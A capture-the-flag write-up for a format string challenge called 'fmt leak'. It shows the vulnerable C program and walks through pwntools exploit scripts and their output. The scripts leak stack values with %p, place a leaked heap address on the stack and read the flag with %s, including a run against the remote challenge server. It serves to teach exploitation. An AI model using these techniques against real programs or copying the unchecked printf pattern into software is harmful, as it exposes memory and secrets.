# fmt leak 

## Description

> Start your journey in format string.

## Write-Up

### Discovery

In this challenge, we have been given a the following `C` code :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAG_LEN 34
#define NAME_LEN 50

// gcc  -Wl,-z,relro,-z,now -m32 -o chall source.c

void disable_buffering() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

int main(void) {
    
    disable_buffering();

    char *flag = (char*) malloc(sizeof(char)*FLAG_LEN);
    memcpy(flag, "shellmates{XXXXXXXXXXXXXXXXXXXXX}", FLAG_LEN);
    printf("This may help later : 0x%x\n",flag);

    char name[NAME_LEN];
    
    printf("Name : ");
    fgets(name, NAME_LEN, stdin);
    
    printf("Hi, ");
    printf(name);
    
    free(flag);
    
    return 0;
}
```

And as we analyze it closely, we can easily find that it has a **Format String Vulnerability** :

```c
...
    printf("Name : ");
    fgets(name, NAME_LEN, stdin)

    printf("Hi, ");
    printf(name);
...
```

The secret ingredient in the format string is the `format specifier` :

> **Format specifiers** define the type of data to be printed on standard output. You need to use format specifiers whether you're printing formatted output with printf() or  accepting input with scanf().

When the program sees a format specifier, it knows to expect a variable to replace that specifier.

By knowing that, we can through a Format string vulnerability make the program print to us values that we are not allowed to access by simply entering in the input some format specifiers. This way, the program will consider them as such and prints addresses values from the stack allowed to it. Here's another example (we can use `%x` or `%p`, it will give same result):

```py
#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

p.sendline(b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')
p.interactive()
```

Wit `%x` :

```
[+] Starting local process './chall': pid 27365
b'This may help later : 0x56c241a0\nName : '
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 27365)
Hi, 0x32 0xf7e1d620 0x565c5259 (nil) (nil) 0x70250000 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 [*] Got EOF while reading in interactive
```

Or with `%p` :

```
[+] Starting local process './chall': pid 27216
b'This may help later : 0x56a471a0\nName : '
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 27216)
Hi, 32 f7e1d620 56648259 0 0 78250000 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 [*] Got EOF while reading in interactive
$ 
[*] Interrupted
```

Each value correspond to a format specifier we provided to the program. Of course, it will print only what is in the stack, since that's all what he has access to (Or of course from the heap which we will talk about later). So at some point, no matter how much format specifier we add, it will prints the same values.

But, the interesting part is that we can also write in the stack when exploiting the format string vulnerability :

```py
...
p.sendline(b'AAAAAA %p %p %p %p %p %p %p %p %p %p %p %p')
...
```

```
[+] Starting local process './chall': pid 66962
b'This may help later : 0x56d1c1a0\nName : '
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 66962)
Hi, AAAAAA 0x32 0xf7e1d620 0x565ee259 (nil) (nil) 0x41410000 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
[*] Got EOF while reading in interactive
```

More speceficaly :

```
Name : AAAAAA - %p - %p - %p - %p - %p - %p - %p
Hi, AAAAAA - 0x32 - 0xf7e1d620 - 0x565e2259 - (nil) - (nil) - 0x41410000 - 0x41414141
```

Note how the `AAAAAA` string is printed back, and as we can see in the 7th value, `0x41414141` a hex representation of it (is has also a part of it in the 6th value as well).

This give us a decent knowledge to solve the challenge if the flag was stored in the stack. But how about the heap ? Since the flag string is dynamically allocated in the program ?

Well, we can do a trick for that.

### The Trick

In order for us to solve the challenge, the idea is actually to make a passage from our input to the heap, passing by the stack.

To do that, the idea is actually storing the address of the flag in the stack. This way we can access it, and by a redirection, access the flag.

Remember the `AAAAAA` string earlier ? well our address will take its place (Note the extraction of the address, since it will change on each execution) :

```py
#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

# [+] Starting local process './chall': pid 24502
# b'This may help later : 0x570a31a0\nName : '
address = p.recv().split()[5]
addressBytesInStack = p32(int(str(address)[2:-1], 16))

p.sendline(addressBytesInStack + b' %p %p %p %p %p %p %p')

p.interactive()
```

From here, accessing is simple. We need only to use the `%s` specifier to make the program use the value of the adress in the stack as a pointer to the flag :

```py
...
p.sendline(addressBytesInStack + b' %p %p %p %p %p %p %s')
...
```

One last thing, we need to make sure that our address is stored in one address instead of two. Let me explain :


```
➜   ./chall
This may help later : 0x575671a0
Name : AABBBB - %p - %p - %p - %p - %p - %p - %p
Hi, AABBBB - 0x32 - 0xf7e1d620 - 0x565e7259 - (nil) - (nil) - 0x41410000 - 0x42424242
```

As we can see here, the string we add to the program will actually be splitted in two, this way, it will be hard for us recover the flag. Instead, we will make sure to store it in one address by filling the first part with placeholder :

```py
...
p.sendline(b'AA' + addressBytesInStack + b' %p %p %p %p %p %p %s ')
...
```

Finally, let's execute the program locally :

```
[+] Starting local process './chall': pid 73843
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 73843)
Hi, AA\xa0\xf1X 0x32 0xf7e1d620 0x56564259 (nil) (nil) 0x41410000 shellmates{XXXXXXXXXXXXXXXXXXXXX} 
[*] Got EOF while reading in interactive
```

Now using the following program to execute it on the remote :

```py
#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '140'

p = remote(HOST, PORT)

address = p.recv().split()[5]
addressBytesInStack = p32(int(str(address)[2:-1], 16))


p.sendline(b'AA' + addressBytesInStack + b' %p %p %p %p %p %p %s ')

p.interactive()

```

Result :

```
[+] Opening connection to pwn.challs.ctf.shellmates.club on port 1401: Done
[*] Switching to interactive mode
Hi, AA\xa0\xc1\xfbW 0x32 0xf7ee5620 0x56601259 (nil) (nil) 0x41410000 shellmates{FMT_STR1NG_HITS_AGAIN} 
[*] Got EOF while reading in interactive
```


## Flag

shellmates{FMT_STR1NG_HITS_AGAIN}

## More Information

 - Format String attack : https://owasp.org/www-community/attacks/Format_string_attack
 - Format String leak : https://wiki.bi0s.in/pwning/format-string/leak/
 - How to Read & Write to a Program's Memory Using a Format String Vulnerability  : https://null-byte.wonderhowto.com/how-to/exploit-development-read-write-programs-memory-using-format-string-vulnerability-0181919/
 - Format specifiers : https://www.freecodecamp.org/news/format-specifiers-in-c/
